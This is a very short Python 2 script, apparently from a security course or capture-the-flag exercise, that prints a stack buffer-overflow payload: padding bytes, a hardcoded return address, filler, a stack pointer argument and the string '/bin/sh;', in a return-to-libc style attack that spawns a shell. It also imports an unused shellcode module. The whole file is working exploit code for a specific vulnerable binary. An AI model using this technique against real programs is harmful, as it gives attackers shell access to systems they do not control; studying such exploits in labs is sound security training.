from struct import pack
from shellcode import shellcode
print(('A'*22) + pack('<I', 0x0804ef50) + ('A'*4) + pack('<I', 0xbffe9be8) + "/bin/sh;")
